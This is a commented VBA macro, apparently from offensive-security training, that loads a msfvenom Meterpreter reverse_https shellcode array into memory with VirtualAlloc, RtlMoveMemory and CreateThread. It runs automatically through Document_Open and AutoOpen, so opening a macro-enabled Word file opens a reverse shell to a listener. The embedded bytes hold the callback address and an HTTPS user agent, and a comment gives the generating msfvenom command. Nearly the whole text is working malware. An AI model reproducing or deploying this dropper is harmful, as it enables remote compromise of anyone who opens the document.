' This code demonstrates how to execute shellcode in memory with VBA.
' We'll need to take a look at the VirtualAlloc, RtlMoveMemory and CreateThread win32 APIs
' located in Kernel32.dll and translate the arguments/types to VBA.
' When a word document (or another application of your choice) opens with this macro
' enabled. It will call back to our meterpreter listener with a reverse shell.
' Keep in mind this shell will only be active as long as the application is running.

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ' The VirtualAlloc API allows us to allocate memory or our shellcode
(ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal 
flAllocationType As Long, ByVal flProtect As Long) As LongPtr

' We will copy the shellcode into our memory with RtlMoveMemory

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" 
(ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

' We will run the shellcode with CreateThread

 Private Declare PtrSafe Function CreateThread Lib "Kernel32" (ByVal SecurityAttributes As Long, 
 ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal 
 CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function MyMacro()
    Dim buf as Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    buf = Array(252,232,143,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20,15,183,74,38,49,255,139,114,40,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,72,24,139,88,32,1,211,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,132,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,41,32,65,112,112,108,101,87,101,98,75,105,116,47,53,51,55,46,51,54,32, _
40,75,72,84,77,76,44,32,108,105,107,101,32,71,101,99,107,111,41,32,67,104,114,111,109,101,47,57,56,46,48,46,52,55,53,56,46,56,49,32,83,97,102,97,114,105,47,53,51,55,46,51,54,32,69,100,103,47,57,55,46,48,46,49,48,55,50,46,54,57,0,104,58,86,121,167,255,213,83,83, _
106,3,83,83,104,187,1,0,0,232,54,1,0,0,47,117,49,69,98,55,50,118,114,68,97,75,98,71,90,111,89,95,48,112,57,89,81,117,87,110,51,111,102,71,71,118,69,113,84,111,84,105,90,78,95,68,107,122,54,98,77,87,65,122,106,103,45,72,67,66,56,89,102,81,110,117,71,88,82,74, _
51,103,86,116,89,48,122,80,111,99,52,66,102,68,53,74,74,83,111,87,76,114,101,121,121,121,115,122,74,116,83,111,50,88,80,121,115,100,79,69,105,66,72,85,49,69,116,83,97,119,81,115,115,86,83,115,45,119,72,45,108,76,88,116,120,72,53,103,82,89,90,106,118,72,73,68,103,77,98,112, _
105,84,98,121,120,51,74,107,115,70,69,50,72,54,69,108,117,114,111,115,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104, _
45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192, _
117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,49,49,57,46,49,50,48,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213)

' Above shellcode generated with "msfvenom -p windows/meterpreter/reverse_https LHOST=X.X.X.X LPORT = 443 EXITFUNC=thread -f vbapplication"

    addr = VirtualAlloc(0, UBound(buf), &H300, &H40) ' allocating our memory


    For counter = LBound(buf) To UBound(buf)    ' copying shellcode to memory
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0,0, addr, 0, 0, 0)   'executing shellcode
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub



